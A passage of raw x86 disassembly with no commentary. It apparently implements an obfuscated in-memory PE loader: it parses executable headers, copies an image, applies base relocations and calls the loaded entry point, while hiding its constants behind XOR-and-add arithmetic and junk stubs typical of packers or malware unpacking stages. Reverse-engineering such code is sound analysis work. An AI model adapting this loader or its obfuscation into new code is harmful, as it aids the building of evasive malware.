  4131ba:	mov    edx,DWORD PTR [ebp-0x4]
  4131bd:	xor    eax,ebx
  4131bf:	lea    eax,[eax+edx*1+0x3272dd]
  4131c6:	mov    DWORD PTR [ebp-0x4],eax
  4131c9:	mov    eax,DWORD PTR [ebp-0x14]
  4131cc:	xor    eax,ebx
  4131ce:	mov    edx,0xffcd8d23
  4131d3:	sub    edx,eax
  4131d5:	add    edx,DWORD PTR [ebp-0x24]
  4131d8:	mov    eax,DWORD PTR [ebp-0x14]
  4131db:	mov    edi,DWORD PTR [ebp-0x4]
  4131de:	xor    eax,ebx
  4131e0:	add    eax,esi
  4131e2:	imul   eax,edi
  4131e5:	cmp    eax,edx
  4131e7:	jbe    0x4130c9
  4131ed:	push   DWORD PTR [ebp+0x8]
  4131f0:	mov    eax,DWORD PTR [ebp+0x8]
  4131f3:	push   DWORD PTR [eax+0x1cc]
  4131f9:	lea    eax,[ebp-0xa0]
  4131ff:	push   eax
  413200:	mov    eax,DWORD PTR [ebp+0x8]
  413203:	mov    eax,DWORD PTR [eax+0x1c4]
  413209:	push   DWORD PTR [eax]
  41320b:	mov    eax,DWORD PTR [ebp+0x8]
  41320e:	mov    eax,DWORD PTR [eax+0x1c0]
  413214:	push   DWORD PTR [eax]
  413216:	push   DWORD PTR [ebp-0x30]
  413219:	push   DWORD PTR [ebp-0x20]
  41321c:	call   0x413cf2
  413221:	mov    DWORD PTR [ebp-0x2c],eax
  413224:	mov    eax,DWORD PTR [ebp-0x8]
  413227:	mov    ecx,DWORD PTR [ebp-0x20]
  41322a:	xor    eax,ebx
  41322c:	add    eax,esi
  41322e:	cmp    eax,ecx
  413230:	je     0x413251
  413232:	mov    eax,DWORD PTR [ebp+0x8]
  413235:	mov    ecx,DWORD PTR [ebp-0x48]
  413238:	mov    eax,DWORD PTR [eax+0x1d8]
  41323e:	xor    ecx,ebx
  413240:	add    ecx,esi
  413242:	push   ecx
  413243:	mov    ecx,DWORD PTR [ebp-0x8]
  413246:	xor    ecx,ebx
  413248:	add    ecx,esi
  41324a:	push   ecx
  41324b:	push   DWORD PTR [ebp-0x20]
  41324e:	call   DWORD PTR [eax+0x18]
  413251:	pop    edi
  413252:	pop    esi
  413253:	pop    ebx
  413254:	leave  
  413255:	ret    0x4
  413258:	push   ebp
  413259:	mov    ebp,esp
  41325b:	push   ecx
  41325c:	push   ecx
  41325d:	lea    eax,[ebp-0x8]
  413260:	mov    DWORD PTR [ebp-0x4],eax
  413263:	push   esi
  413264:	mov    esi,DWORD PTR [ebp-0x4]
  413267:	mov    eax,0xf881ba0f
  41326c:	mov    DWORD PTR [esi],eax
  41326e:	mov    esi,DWORD PTR [ebp-0x8]
  413271:	cmp    esi,eax
  413273:	pop    esi
  413274:	jne    0x41327e
  413276:	mov    BYTE PTR [ecx+0xa],0x7a
  41327a:	mov    BYTE PTR [edx+0x8],0x2f
  41327e:	mov    BYTE PTR [edx+0xa],0x7a
  413282:	mov    BYTE PTR [ecx+0x2],0x8
  413286:	leave  
  413287:	ret    
  413288:	push   ebp
  413289:	mov    ebp,esp
  41328b:	push   ecx
  41328c:	push   ecx
  41328d:	lea    eax,[ebp-0x8]
  413290:	mov    DWORD PTR [ebp-0x4],eax
  413293:	mov    edx,DWORD PTR [ebp-0x4]
  413296:	mov    eax,0xf88b0beb
  41329b:	mov    DWORD PTR [edx],eax
  41329d:	mov    edx,DWORD PTR [ebp-0x8]
  4132a0:	cmp    edx,eax
  4132a2:	jne    0x4132b3
  4132a4:	mov    eax,DWORD PTR [ebp+0x8]
  4132a7:	mov    BYTE PTR [ecx+0x9],0xe
  4132ab:	mov    BYTE PTR [eax+0x7],0x47
  4132af:	mov    BYTE PTR [ecx+0x6],0xf
  4132b3:	mov    BYTE PTR [ecx+0x3],0x1e
  4132b7:	leave  
  4132b8:	ret    0x4
  4132bb:	push   ebp
  4132bc:	mov    ebp,esp
  4132be:	push   ecx
  4132bf:	push   ecx
  4132c0:	lea    eax,[ebp-0x8]
  4132c3:	mov    DWORD PTR [ebp-0x4],eax
  4132c6:	mov    edx,DWORD PTR [ebp-0x4]
  4132c9:	mov    eax,0x7e0da0f
  4132ce:	mov    DWORD PTR [edx],eax
  4132d0:	mov    edx,DWORD PTR [ebp-0x8]
  4132d3:	cmp    edx,eax
  4132d5:	jne    0x4132db
  4132d7:	mov    BYTE PTR [ecx+0x7],0x47
  4132db:	mov    eax,DWORD PTR [ebp+0x8]
  4132de:	mov    BYTE PTR [ecx+0x1],0x5
  4132e2:	mov    BYTE PTR [eax+0x9],0x2e
  4132e6:	leave  
  4132e7:	ret    0x4
  4132ea:	push   ebp
  4132eb:	mov    ebp,esp
  4132ed:	push   ecx
  4132ee:	push   ecx
  4132ef:	lea    eax,[ebp-0x8]
  4132f2:	mov    DWORD PTR [ebp-0x4],eax
  4132f5:	push   esi
  4132f6:	mov    esi,DWORD PTR [ebp-0x4]
  4132f9:	mov    eax,0x7060e3c
  4132fe:	mov    DWORD PTR [esi],eax
  413300:	mov    esi,DWORD PTR [ebp-0x8]
  413303:	cmp    esi,eax
  413305:	pop    esi
  413306:	jne    0x413312
  413308:	mov    BYTE PTR [edx+0x4],0xb
  41330c:	mov    WORD PTR [ecx+0x3],0xb1e
  413312:	mov    BYTE PTR [edx],0x3f
  413315:	leave  
  413316:	ret    
  413317:	push   ebp
  413318:	mov    ebp,esp
  41331a:	push   ecx
  41331b:	push   ecx
  41331c:	lea    eax,[ebp-0x8]
  41331f:	mov    DWORD PTR [ebp-0x4],eax
  413322:	mov    edx,DWORD PTR [ebp-0x4]
  413325:	mov    eax,0xf8870b3f
  41332a:	mov    DWORD PTR [edx],eax
  41332c:	mov    edx,DWORD PTR [ebp-0x8]
  41332f:	cmp    edx,eax
  413331:	jne    0x41333e
  413333:	mov    eax,DWORD PTR [ebp+0x8]
  413336:	mov    BYTE PTR [ecx+0x8],0xf
  41333a:	mov    BYTE PTR [eax+0x1],0x5
  41333e:	mov    BYTE PTR [ecx+0x5],0xf3
  413342:	leave  
  413343:	ret    0x4
  413346:	push   esi
  413347:	mov    ecx,edi
  413349:	call   0x413317
  41334e:	mov    edx,edi
  413350:	mov    ecx,esi
  413352:	mov    BYTE PTR [esi],0x1f
  413355:	call   0x4132ea
  41335a:	push   esi
  41335b:	mov    ecx,edi
  41335d:	mov    BYTE PTR [esi+0x5],0xf3
  413361:	call   0x4132bb
  413366:	push   esi
  413367:	mov    BYTE PTR [esi+0x6],0xf
  41336b:	call   0x413288
  413370:	mov    BYTE PTR [esi+0x2],0x8
  413374:	mov    edx,esi
  413376:	jmp    0x413258
  41337b:	push   ebp
  41337c:	mov    ebp,esp
  41337e:	push   ecx
  41337f:	mov    ecx,DWORD PTR [edx+0x194]
  413385:	push   esi
  413386:	mov    esi,DWORD PTR [ebp+0x8]
  413389:	mov    esi,DWORD PTR [esi]
  41338b:	mov    DWORD PTR [ecx],esi
  41338d:	mov    ecx,DWORD PTR [edx+0x194]
  413393:	mov    ecx,DWORD PTR [ecx]
  413395:	mov    esi,DWORD PTR [edx+0x190]
  41339b:	mov    DWORD PTR [esi],ecx
  41339d:	mov    eax,DWORD PTR [edx+0x194]
  4133a3:	mov    ecx,DWORD PTR [eax]
  4133a5:	mov    ecx,DWORD PTR [ecx+0x3c]
  4133a8:	add    ecx,DWORD PTR [eax]
  4133aa:	mov    DWORD PTR [ebp-0x4],0xf89ca5b5
  4133b1:	mov    eax,DWORD PTR [ebp-0x4]
  4133b4:	movzx  ecx,WORD PTR [ecx+0x16]
  4133b8:	xor    eax,0x7510896
  4133bd:	add    eax,0x3272dd
  4133c2:	pop    esi
  4133c3:	test   ecx,eax
  4133c5:	je     0x4133d3
  4133c7:	mov    eax,DWORD PTR [edx+0x1c8]
  4133cd:	mov    DWORD PTR [eax],0xf89c85b2
  4133d3:	leave  
  4133d4:	ret    0x4
  4133d7:	push   ebp
  4133d8:	mov    ebp,esp
  4133da:	sub    esp,0x70
  4133dd:	and    DWORD PTR [ebp-0x20],0x0
  4133e1:	mov    DWORD PTR [ebp-0x18],0xf89cb5b5
  4133e8:	mov    DWORD PTR [ebp-0x1c],0xf89c85f5
  4133ef:	mov    DWORD PTR [ebp-0x2c],0xf89c85b1
  4133f6:	mov    DWORD PTR [ebp-0x14],0xf89c85b3
  4133fd:	mov    DWORD PTR [ebp-0x2c],0xf89f05b5
  413404:	mov    eax,DWORD PTR [ebp+0x20]
  413407:	mov    eax,DWORD PTR [eax+0x194]
  41340d:	mov    DWORD PTR [ebp-0xc],eax
  413410:	mov    eax,DWORD PTR [ebp+0x20]
  413413:	push   ebx
  413414:	push   esi
  413415:	mov    esi,DWORD PTR [eax+0x190]
  41341b:	mov    eax,DWORD PTR [ebp+0x20]
  41341e:	mov    eax,DWORD PTR [eax+0x18c]
  413424:	mov    DWORD PTR [ebp-0x8],eax
  413427:	mov    eax,DWORD PTR [eax]
  413429:	push   edi
  41342a:	mov    DWORD PTR [ebp-0x4],esi
  41342d:	test   eax,eax
  41342f:	jne    0x41343c
  413431:	push   DWORD PTR [ebp+0x1c]
  413434:	mov    edx,DWORD PTR [ebp+0x20]
  413437:	call   0x41337b
  41343c:	mov    eax,DWORD PTR [esi]
  41343e:	mov    ebx,DWORD PTR [esi]
  413440:	add    ebx,DWORD PTR [eax+0x3c]
  413443:	mov    eax,DWORD PTR [ebp+0xc]
  413446:	mov    ecx,DWORD PTR [ebp-0x8]
  413449:	mov    ecx,DWORD PTR [ecx]
  41344b:	mov    esi,0x7510896
  413450:	xor    eax,esi
  413452:	mov    edi,0x3272dd
  413457:	add    eax,edi
  413459:	cmp    eax,ecx
  41345b:	jne    0x413693
  413461:	mov    eax,DWORD PTR [ebp-0xc]
  413464:	mov    eax,DWORD PTR [eax]
  413466:	mov    DWORD PTR [ebp-0x10],eax
  413469:	mov    eax,DWORD PTR [ebx+0x50]
  41346c:	mov    DWORD PTR [ebp-0x68],eax
  41346f:	mov    eax,DWORD PTR [ebp-0x18]
  413472:	xor    eax,esi
  413474:	add    eax,edi
  413476:	mov    DWORD PTR [ebp-0x64],eax
  413479:	mov    eax,DWORD PTR [ebp-0x14]
  41347c:	and    DWORD PTR [ebp-0x6c],0x0
  413480:	xor    eax,esi
  413482:	add    eax,edi
  413484:	mov    DWORD PTR [ebp-0x60],eax
  413487:	lea    eax,[ebp-0x70]
  41348a:	push   eax
  41348b:	mov    eax,DWORD PTR [ebp+0x8]
  41348e:	xor    eax,esi
  413490:	add    eax,edi
  413492:	push   eax
  413493:	mov    eax,DWORD PTR [ebp+0x20]
  413496:	add    eax,0xaa
  41349b:	push   eax
  41349c:	mov    eax,DWORD PTR [ebp+0x20]
  41349f:	mov    eax,DWORD PTR [eax+0x198]
  4134a5:	mov    DWORD PTR [ebp-0x70],0x4
  4134ac:	push   DWORD PTR [eax]
  4134ae:	mov    eax,DWORD PTR [ebp+0x10]
  4134b1:	call   eax
  4134b3:	mov    ecx,DWORD PTR [ebp-0xc]
  4134b6:	mov    ecx,DWORD PTR [ecx]
  4134b8:	mov    edx,DWORD PTR [ebp-0x8]
  4134bb:	mov    DWORD PTR [ebp-0x6c],eax
  4134be:	mov    DWORD PTR [ebp+0x1c],eax
  4134c1:	mov    DWORD PTR [edx],ecx
  4134c3:	mov    ecx,DWORD PTR [ebp-0x4]
  4134c6:	mov    DWORD PTR [ecx],eax
  4134c8:	mov    eax,DWORD PTR [ebx+0x50]
  4134cb:	mov    DWORD PTR [ebp-0x68],eax
  4134ce:	mov    eax,DWORD PTR [ebp-0x1c]
  4134d1:	xor    eax,esi
  4134d3:	add    eax,edi
  4134d5:	mov    DWORD PTR [ebp-0x64],eax
  4134d8:	lea    eax,[ebp-0x20]
  4134db:	mov    DWORD PTR [ebp-0x60],eax
  4134de:	lea    eax,[ebp-0x70]
  4134e1:	push   eax
  4134e2:	mov    eax,DWORD PTR [ebp+0x8]
  4134e5:	xor    eax,esi
  4134e7:	add    eax,edi
  4134e9:	push   eax
  4134ea:	mov    eax,DWORD PTR [ebp+0x20]
  4134ed:	add    eax,0xee
  4134f2:	push   eax
  4134f3:	mov    eax,DWORD PTR [ebp+0x20]
  4134f6:	mov    eax,DWORD PTR [eax+0x198]
  4134fc:	mov    DWORD PTR [ebp-0x70],0x4
  413503:	push   DWORD PTR [eax]
  413505:	mov    eax,DWORD PTR [ebp+0x10]
  413508:	call   eax
  41350a:	test   eax,eax
  41350c:	je     0x413531
  41350e:	and    DWORD PTR [ebp+0xc],0x0
  413512:	cmp    DWORD PTR [ebx+0x50],0x0
  413516:	jbe    0x413531
  413518:	mov    eax,DWORD PTR [ebp+0x1c]
  41351b:	mov    ecx,DWORD PTR [ebp-0x10]
  41351e:	sub    ecx,eax
  413520:	mov    dl,BYTE PTR [ecx+eax*1]
  413523:	inc    DWORD PTR [ebp+0xc]
  413526:	mov    BYTE PTR [eax],dl
  413528:	mov    edx,DWORD PTR [ebp+0xc]
  41352b:	inc    eax
  41352c:	cmp    edx,DWORD PTR [ebx+0x50]
  41352f:	jb     0x413520
  413531:	mov    edx,DWORD PTR [ebp+0x1c]
  413534:	mov    ecx,DWORD PTR [edx+0x3c]
  413537:	add    ecx,edx
  413539:	mov    eax,DWORD PTR [ecx+0xa0]
  41353f:	mov    ebx,DWORD PTR [ecx+0x28]
  413542:	add    eax,edx
  413544:	sub    edx,DWORD PTR [ebp-0x10]
  413547:	add    ebx,DWORD PTR [ebp+0x1c]
  41354a:	mov    DWORD PTR [ebp+0xc],edx
  41354d:	mov    DWORD PTR [ebp-0x2c],ecx
  413550:	mov    DWORD PTR [ebp-0x14],ebx
  413553:	mov    DWORD PTR [ebp-0x8],0x0
  41355a:	jmp    0x4135d6
  41355c:	add    edx,0xfffffff8
  41355f:	shr    edx,1
  413561:	mov    DWORD PTR [ebp-0x18],edx
  413564:	je     0x4135c2
  413566:	lea    edx,[eax+0x8]
  413569:	mov    DWORD PTR [ebp-0x4],edx
  41356c:	mov    edx,DWORD PTR [ebp-0x18]
  41356f:	mov    DWORD PTR [ebp-0x18],edx
  413572:	mov    edx,DWORD PTR [ebp-0x4]
  413575:	movzx  edx,WORD PTR [edx]
  413578:	mov    DWORD PTR [ebp-0x24],edx
  41357b:	and    edx,0xfff
  413581:	mov    DWORD PTR [ebp-0x28],edx
  413584:	mov    edx,DWORD PTR [ebp-0x24]
  413587:	shr    edx,0xc
  41358a:	add    edx,0xffcd8d23
  413590:	xor    edx,esi
  413592:	cmp    edx,0xf89c85b0
  413598:	jne    0x4135b9
  41359a:	mov    edx,DWORD PTR [ebp-0x28]
  41359d:	add    edx,DWORD PTR [ebp+0x1c]
  4135a0:	mov    ebx,DWORD PTR [eax]
  4135a2:	cmp    DWORD PTR [ebx+edx*1],0x0
  4135a6:	je     0x4135b6
  4135a8:	mov    ecx,DWORD PTR [ebp+0xc]
  4135ab:	add    ecx,DWORD PTR [ebx+edx*1]
  4135ae:	mov    ebx,DWORD PTR [eax]
  4135b0:	mov    DWORD PTR [edx+ebx*1],ecx
  4135b3:	mov    ecx,DWORD PTR [ebp-0x2c]
  4135b6:	mov    ebx,DWORD PTR [ebp-0x14]
  4135b9:	add    DWORD PTR [ebp-0x4],0x2
  4135bd:	dec    DWORD PTR [ebp-0x18]
  4135c0:	jne    0x413572
  4135c2:	mov    edx,DWORD PTR [ebp-0xc]
  4135c5:	add    DWORD PTR [ebp-0x8],edx
  4135c8:	mov    edx,DWORD PTR [ebp-0x8]
  4135cb:	cmp    edx,DWORD PTR [ecx+0xa4]
  4135d1:	jae    0x4135e4
  4135d3:	add    eax,DWORD PTR [ebp-0xc]
  4135d6:	mov    edx,DWORD PTR [eax+0x4]
  4135d9:	mov    DWORD PTR [ebp-0xc],edx
  4135dc:	test   edx,edx
  4135de:	jne    0x41355c
  4135e4:	mov    eax,DWORD PTR [ebp-0x10]
  4135e7:	mov    DWORD PTR [ebp-0x6c],eax
  4135ea:	mov    DWORD PTR [ebp-0x70],0x4
  4135f1:	mov    eax,DWORD PTR [ecx+0x50]
  4135f4:	mov    DWORD PTR [ebp-0x68],eax
  4135f7:	mov    eax,DWORD PTR [ebp-0x1c]
  4135fa:	xor    eax,esi
  4135fc:	add    eax,edi
  4135fe:	mov    DWORD PTR [ebp-0x64],eax
  413601:	lea    eax,[ebp-0x20]
  413604:	mov    DWORD PTR [ebp-0x60],eax
  413607:	lea    eax,[ebp-0x70]
  41360a:	push   eax
  41360b:	mov    eax,DWORD PTR [ebp+0x8]
  41360e:	xor    eax,esi
  413610:	add    eax,edi
  413612:	push   eax
  413613:	mov    eax,DWORD PTR [ebp+0x20]
  413616:	add    eax,0xee
  41361b:	push   eax
  41361c:	mov    eax,DWORD PTR [ebp+0x20]
  41361f:	mov    eax,DWORD PTR [eax+0x198]
  413625:	push   DWORD PTR [eax]
  413627:	mov    eax,DWORD PTR [ebp+0x10]
  41362a:	call   eax
  41362c:	mov    eax,DWORD PTR [ebp+0x20]
  41362f:	mov    eax,DWORD PTR [eax+0x180]
  413635:	add    eax,DWORD PTR [ebp+0xc]
  413638:	mov    ecx,DWORD PTR [ebp+0xc]
  41363b:	push   DWORD PTR [ebp+0x18]
  41363e:	mov    DWORD PTR [eax],ecx
  413640:	push   DWORD PTR [ebp+0x14]
  413643:	push   DWORD PTR [ebp+0x1c]
  413646:	call   ebx
  413648:	mov    eax,DWORD PTR [ebp+0xc]
  41364b:	add    eax,DWORD PTR [ebp+0x20]
  41364e:	lea    ecx,[ebp+0x4]
  413651:	mov    DWORD PTR [ebp+0x20],eax
  413654:	mov    eax,DWORD PTR [ebp+0x20]
  413657:	mov    eax,DWORD PTR [ebp+0x20]
  41365a:	mov    edx,DWORD PTR [eax+0x190]
  413660:	mov    eax,DWORD PTR [ebp+0x20]
  413663:	mov    eax,DWORD PTR [eax+0x18c]
  413669:	mov    esi,DWORD PTR [eax]
  41366b:	cmp    DWORD PTR [ecx],esi
  41366d:	jb     0x41368e
  41366f:	mov    esi,DWORD PTR [edx]
  413671:	mov    edi,DWORD PTR [edx]
  413673:	mov    esi,DWORD PTR [esi+0x3c]
  413676:	lea    esi,[edi+esi*1+0x50]
  41367a:	mov    edi,DWORD PTR [eax]
  41367c:	add    edi,DWORD PTR [esi]
  41367e:	cmp    DWORD PTR [ecx],edi
  413680:	jae    0x41368e
  413682:	mov    esi,DWORD PTR [eax]
  413684:	mov    eax,DWORD PTR [ecx]
  413686:	mov    edx,DWORD PTR [edx]
  413688:	sub    eax,esi
  41368a:	add    edx,eax
  41368c:	mov    DWORD PTR [ecx],edx
  41368e:	mov    eax,DWORD PTR [ebp+0xc]
  413691:	jmp    0x4136d4
  413693:	push   DWORD PTR [ebp+0x20]
  413696:	call   0x412804
  41369b:	mov    eax,DWORD PTR [ebp+0x20]
  41369e:	mov    eax,DWORD PTR [eax+0x1c8]
  4136a4:	mov    eax,DWORD PTR [eax]
  4136a6:	xor    eax,esi
  4136a8:	add    eax,edi
  4136aa:	mov    eax,DWORD PTR [ebp+0x20]
  4136ad:	jne    0x4136c5
  4136af:	mov    ecx,DWORD PTR [ebp+0x20]
  4136b2:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4136b8:	push   DWORD PTR [ecx]
  4136ba:	mov    eax,DWORD PTR [eax+0x1d8]
  4136c0:	call   DWORD PTR [eax+0x28]
  4136c3:	jmp    0x4136d2
  4136c5:	mov    eax,DWORD PTR [eax+0x17c]
  4136cb:	mov    ecx,DWORD PTR [eax]
  4136cd:	lea    eax,[ebp+0x4]
  4136d0:	add    DWORD PTR [eax],ecx
  4136d2:	xor    eax,eax
  4136d4:	pop    edi
  4136d5:	pop    esi
  4136d6:	pop    ebx
  4136d7:	leave  
  4136d8:	ret    0x1c
  4136db:	push   ebp
  4136dc:	mov    ebp,esp
  4136de:	sub    esp,0x1c
  4136e1:	push   esi
  4136e2:	mov    esi,eax
  4136e4:	mov    eax,DWORD PTR [ecx+0x190]
  4136ea:	cmp    DWORD PTR [eax],0x0
  4136ed:	je     0x4137fd
  4136f3:	test   edx,edx
  4136f5:	je     0x4137fd
  4136fb:	test   esi,esi
  4136fd:	je     0x4137fd
  413703:	mov    eax,DWORD PTR [esi+0x88]
  413709:	test   eax,eax
  41370b:	je     0x4137f8
  413711:	cmp    DWORD PTR [esi+0x8c],0x10
  413718:	je     0x4137f8
  41371e:	cmp    DWORD PTR [esi+0x34],edx
  413721:	je     0x4137f8
  413727:	mov    esi,DWORD PTR [ecx+0x18c]
  41372d:	and    DWORD PTR [ebp-0x10],0x0
  413731:	mov    ecx,edx
  413733:	sub    ecx,DWORD PTR [esi]
  413735:	add    eax,edx
  413737:	movzx  edx,WORD PTR [eax+0xc]
  41373b:	mov    DWORD PTR [ebp-0x1c],ecx
  41373e:	movzx  ecx,WORD PTR [eax+0xe]
  413742:	add    ecx,edx
  413744:	je     0x4137f8
  41374a:	lea    ecx,[eax+0x14]
  41374d:	push   ebx
  41374e:	mov    DWORD PTR [ebp-0x18],ecx
  413751:	mov    esi,0x7fffffff
  413756:	push   edi
  413757:	test   DWORD PTR [ecx],esi
  413759:	je     0x4137da
  41375b:	mov    edx,DWORD PTR [ecx]
  41375d:	and    DWORD PTR [ebp-0xc],0x0
  413761:	and    edx,esi
  413763:	add    edx,eax
  413765:	movzx  edi,WORD PTR [edx+0xe]
  413769:	movzx  ebx,WORD PTR [edx+0xc]
  41376d:	add    edi,ebx
  41376f:	je     0x4137da
  413771:	lea    ecx,[edx+0x14]
  413774:	mov    DWORD PTR [ebp-0x14],ecx
  413777:	test   DWORD PTR [ecx],esi
  413779:	je     0x4137bc
  41377b:	mov    ecx,DWORD PTR [ecx]
  41377d:	and    DWORD PTR [ebp-0x8],0x0
  413781:	and    ecx,esi
  413783:	add    ecx,eax
  413785:	movzx  edi,WORD PTR [ecx+0xe]
  413789:	movzx  ebx,WORD PTR [ecx+0xc]
  41378d:	add    edi,ebx
  41378f:	je     0x4137bc
  413791:	lea    edi,[ecx+0x14]
  413794:	mov    DWORD PTR [ebp-0x4],edi
  413797:	mov    edi,DWORD PTR [ebp-0x4]
  41379a:	mov    edi,DWORD PTR [edi]
  41379c:	test   edi,edi
  41379e:	je     0x4137a6
  4137a0:	mov    ebx,DWORD PTR [ebp-0x1c]
  4137a3:	add    DWORD PTR [edi+eax*1],ebx
  4137a6:	movzx  edi,WORD PTR [ecx+0xe]
  4137aa:	movzx  ebx,WORD PTR [ecx+0xc]
  4137ae:	inc    DWORD PTR [ebp-0x8]
  4137b1:	add    DWORD PTR [ebp-0x4],0x8
  4137b5:	add    edi,ebx
  4137b7:	cmp    DWORD PTR [ebp-0x8],edi
  4137ba:	jb     0x413797
  4137bc:	movzx  edi,WORD PTR [edx+0xe]
  4137c0:	movzx  ebx,WORD PTR [edx+0xc]
  4137c4:	mov    ecx,DWORD PTR [ebp-0x14]
  4137c7:	inc    DWORD PTR [ebp-0xc]
  4137ca:	add    ecx,0x8
  4137cd:	add    edi,ebx
  4137cf:	mov    DWORD PTR [ebp-0x14],ecx
  4137d2:	cmp    DWORD PTR [ebp-0xc],edi
  4137d5:	jb     0x413777
  4137d7:	mov    ecx,DWORD PTR [ebp-0x18]
  4137da:	movzx  edx,WORD PTR [eax+0xe]
  4137de:	movzx  edi,WORD PTR [eax+0xc]
  4137e2:	inc    DWORD PTR [ebp-0x10]
  4137e5:	add    ecx,0x8
  4137e8:	add    edx,edi
  4137ea:	mov    DWORD PTR [ebp-0x18],ecx
  4137ed:	cmp    DWORD PTR [ebp-0x10],edx
  4137f0:	jb     0x413757
  4137f6:	pop    edi
  4137f7:	pop    ebx
  4137f8:	xor    eax,eax
  4137fa:	inc    eax
  4137fb:	jmp    0x4137ff
  4137fd:	xor    eax,eax
  4137ff:	pop    esi
  413800:	leave  
  413801:	ret    
  413802:	push   ebp
  413803:	mov    ebp,esp
  413805:	mov    ecx,DWORD PTR [ecx+0x190]
  41380b:	mov    eax,DWORD PTR [ebp+0xc]
  41380e:	sub    esp,0x10
  413811:	push   ebx
  413812:	xor    ebx,ebx
  413814:	push   esi
  413815:	push   edi
  413816:	cmp    DWORD PTR [ecx],ebx
  413818:	je     0x4138a0
  41381e:	cmp    eax,ebx
  413820:	je     0x4138a0
  413822:	cmp    DWORD PTR [eax+0x78],ebx
  413825:	jne    0x41382c
  413827:	xor    eax,eax
  413829:	inc    eax
  41382a:	jmp    0x4138a2
  41382c:	mov    eax,DWORD PTR [eax+0x78]
  41382f:	add    eax,DWORD PTR [ebp+0x8]
  413832:	mov    ecx,DWORD PTR [eax+0x1c]
  413835:	mov    edx,DWORD PTR [eax+0x24]
  413838:	mov    esi,DWORD PTR [eax+0x14]
  41383b:	mov    edi,DWORD PTR [eax+0x18]
  41383e:	add    ecx,DWORD PTR [ebp+0x8]
  413841:	add    edx,DWORD PTR [ebp+0x8]
  413844:	mov    DWORD PTR [ebp-0x4],esi
  413847:	cmp    esi,edi
  413849:	ja     0x41384e
  41384b:	mov    DWORD PTR [ebp-0x4],edi
  41384e:	mov    DWORD PTR [ebp-0x8],ebx
  413851:	cmp    DWORD PTR [ebp-0x4],ebx
  413854:	jbe    0x413827
  413856:	cmp    ebx,DWORD PTR [eax+0x14]
  413859:	jae    0x413861
  41385b:	movzx  esi,WORD PTR [edx+ebx*2]
  41385f:	jmp    0x413863
  413861:	mov    esi,ebx
  413863:	lea    esi,[ecx+esi*4]
  413866:	mov    edi,DWORD PTR [esi]
  413868:	test   edi,edi
  41386a:	je     0x413895
  41386c:	add    edi,DWORD PTR [ebp+0x8]
  41386f:	mov    DWORD PTR [ebp-0x10],edi
  413872:	cmp    edi,eax
  413874:	jbe    0x413886
  413876:	mov    ebx,DWORD PTR [ebp+0xc]
  413879:	mov    ebx,DWORD PTR [ebx+0x7c]
  41387c:	add    ebx,eax
  41387e:	cmp    edi,ebx
  413880:	jae    0x413886
  413882:	mov    esi,DWORD PTR [esi]
  413884:	jmp    0x41388e
  413886:	sub    edi,DWORD PTR [ebp+0x8]
  413889:	mov    DWORD PTR [esi],edi
  41388b:	mov    esi,DWORD PTR [ebp-0x10]
  41388e:	test   esi,esi
  413890:	je     0x4138a0
  413892:	mov    ebx,DWORD PTR [ebp-0x8]
  413895:	inc    ebx
  413896:	mov    DWORD PTR [ebp-0x8],ebx
  413899:	cmp    ebx,DWORD PTR [ebp-0x4]
  41389c:	jb     0x413856
  41389e:	jmp    0x413827
  4138a0:	xor    eax,eax
  4138a2:	pop    edi
  4138a3:	pop    esi
  4138a4:	pop    ebx
  4138a5:	leave  
  4138a6:	ret    0x8
  4138a9:	push   ebp
  4138aa:	mov    ebp,esp
  4138ac:	sub    esp,0x2c
  4138af:	mov    edx,0xf89c85b5
  4138b4:	mov    DWORD PTR [ebp-0x4],edx
  4138b7:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  4138be:	mov    eax,DWORD PTR [ebp-0x4]
  4138c1:	mov    ecx,DWORD PTR [ebp-0x4]
  4138c4:	mov    ecx,DWORD PTR [ebp-0x4]
  4138c7:	mov    ecx,DWORD PTR [ebp-0x4]
  4138ca:	mov    ecx,DWORD PTR [ebp-0x4]
  4138cd:	mov    ecx,DWORD PTR [ebp-0x4]
  4138d0:	push   ebx
  4138d1:	mov    ebx,DWORD PTR [ebp+0x10]
  4138d4:	push   esi
  4138d5:	mov    esi,0x7510896
  4138da:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  4138e1:	mov    ecx,DWORD PTR [ebp-0x4]
  4138e4:	mov    ebx,DWORD PTR [ebx+0x190]
  4138ea:	push   edi
  4138eb:	mov    edi,0x3272dd
  4138f0:	xor    ecx,esi
  4138f2:	xor    eax,esi
  4138f4:	add    eax,edi
  4138f6:	add    ecx,edi
  4138f8:	mov    DWORD PTR [ebp-0x18],eax
  4138fb:	cmp    ecx,DWORD PTR [ebx]
  4138fd:	je     0x413b7e
  413903:	mov    ebx,DWORD PTR [ebp-0x4]
  413906:	mov    ecx,DWORD PTR [ebp+0xc]
  413909:	xor    ebx,esi
  41390b:	add    ebx,edi
  41390d:	cmp    ebx,ecx
  41390f:	je     0x413b7e
  413915:	mov    ebx,DWORD PTR [ebp-0x4]
  413918:	mov    ecx,DWORD PTR [ecx+0x80]
  41391e:	xor    ebx,esi
  413920:	add    ebx,edi
  413922:	cmp    ecx,ebx
  413924:	je     0x413b79
  41392a:	add    ecx,DWORD PTR [ebp+0x8]
  41392d:	mov    DWORD PTR [ebp-0x2c],ecx
  413930:	mov    ebx,edx
  413932:	xor    ebx,esi
  413934:	add    ebx,edi
  413936:	mov    DWORD PTR [ebp-0x10],ebx
  413939:	mov    ebx,DWORD PTR [ebp-0x10]
  41393c:	cmp    ebx,edx
  41393e:	je     0x413952
  413940:	mov    edx,DWORD PTR [ebp-0x10]
  413943:	mov    ebx,DWORD PTR [ebp-0x4]
  413946:	imul   edx,edx,0x14
  413949:	xor    ebx,esi
  41394b:	add    ebx,edi
  41394d:	cmp    DWORD PTR [edx+ecx*1],ebx
  413950:	jne    0x413969
  413952:	mov    edx,DWORD PTR [ebp-0x10]
  413955:	mov    ebx,DWORD PTR [ebp-0x4]
  413958:	imul   edx,edx,0x14
  41395b:	xor    ebx,esi
  41395d:	add    ebx,edi
  41395f:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  413963:	je     0x413b6b
  413969:	mov    eax,DWORD PTR [ebp-0x4]
  41396c:	mov    ebx,DWORD PTR [ebp-0x4]
  41396f:	mov    eax,DWORD PTR [ebp-0x10]
  413972:	imul   eax,eax,0x14
  413975:	add    eax,ecx
  413977:	mov    ecx,DWORD PTR [eax+0x10]
  41397a:	add    ecx,DWORD PTR [ebp+0x8]
  41397d:	xor    ebx,esi
  41397f:	mov    DWORD PTR [ebp-0x1c],ecx
